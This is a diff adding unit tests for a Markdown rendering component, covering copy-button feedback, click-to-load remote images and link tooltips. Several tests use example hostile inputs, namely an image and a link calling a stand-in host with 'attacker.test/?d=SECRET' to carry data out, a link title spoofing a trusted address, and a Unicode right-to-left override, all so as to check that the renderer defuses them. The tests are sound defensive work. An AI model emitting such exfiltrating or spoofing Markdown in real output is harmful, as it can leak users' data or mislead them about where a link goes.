@@ -21,6 +21,25 @@ afterEach(() => {
 });
 
 describe("Markdown", () => {
+  it("says Copied only once the clipboard took the code, and says so when it didn't", async () => {
+    const writeText = vi.fn(async (_text: string) => {});
+    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
+    try {
+      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
+      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
+      expect(writeText).toHaveBeenCalledWith("ls -la\n");
+      await screen.findByRole("button", { name: "Copied" });
+      cleanup();
+      writeText.mockRejectedValueOnce(new DOMException("denied", "NotAllowedError"));
+      renderDom(<Markdown text={"```sh\nls -la\n```"} />);
+      await userEvent.click(screen.getByRole("button", { name: "Copy" }));
+      await screen.findByRole("button", { name: "Couldn't copy" });
+      expect(screen.queryByRole("button", { name: "Copied" })).toBeNull();
+    } finally {
+      vi.unstubAllGlobals();
+    }
+  });
+
   it("highlights tagged code, and guesses the language of untagged code, on every render", () => {
     const untagged = "```\nfn parse(line: &str) -> Option<u32> {\n    let n: u32 = line.trim().parse().ok()?;\n    Some(n)\n}\n```";
     // The highlighter is shared between renders, so the second must come out the same as the first.
@@ -92,6 +111,54 @@ describe("Markdown", () => {
     expect(invoke).toHaveBeenCalledTimes(2);
     expect(networkImages(container)).toEqual([]);
     expect(preview).not.toHaveBeenCalled();
+  });
+
+  it("asks again for a different image put where a loaded one was (#488)", async () => {
+    invoke.mockResolvedValueOnce(PNG);
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    await waitFor(() => expect(container.querySelector("img")?.getAttribute("src")).toBe(PNG));
+    rerender(shown("![a](https://attacker.test/?d=SECRET)"));
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /attacker\.test, click to load/ })).toBeTruthy();
+    expect(invoke).toHaveBeenCalledTimes(1);
+  });
+
+  it("never shows an image that finishes loading after a different one took its place (#488)", async () => {
+    let answer!: (dataUrl: string) => void;
+    invoke.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)));
+    const shown = (text: string) => <Markdown text={text} />;
+    const { container, rerender } = renderDom(shown("![a](https://one.test/a.png)"));
+    await userEvent.click(screen.getByRole("button", { name: /one\.test/ }));
+    rerender(shown("![a](https://two.test/b.png)"));
+    act(() => answer(PNG));
+    await Promise.resolve();
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByRole("button", { name: /two\.test, click to load/ })).toBeTruthy();
+  });
+});
+
+describe("A link's tooltip (#471)", () => {
+  const tip = (text: string) =>
+    renderDom(
+      <LinksProvider preview={vi.fn()} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
+        <Markdown text={text} />
+      </LinksProvider>,
+    ).container.querySelector("a")!.title;
+
+  it("starts with the real address whatever title the Markdown gives", () => {
+    const shown = tip('[the docs](https://attacker.test/?d=SECRET "https://docs.python.org/3/\nOpens in the preview")');
+    expect(shown.startsWith("https://attacker.test/?d=SECRET\nOpens in the preview\n")).toBe(true);
+    expect(shown.split("\n")).toEqual(["https://attacker.test/?d=SECRET", "Opens in the preview", "https://docs.python.org/3/ Opens in the preview"]);
+  });
+
+  it("keeps a title's direction overrides from reaching back into the address", () => {
+    expect(tip('[x](https://a.test/ "\u202Eevil")')).toBe("https://a.test/\nOpens in the preview\n\uFFFDevil");
+  });
+
+  it("is just the address and where it opens when the Markdown gives no title", () => {
+    expect(tip("[x](https://a.test/)")).toBe("https://a.test/\nOpens in the preview");
   });
 });
 
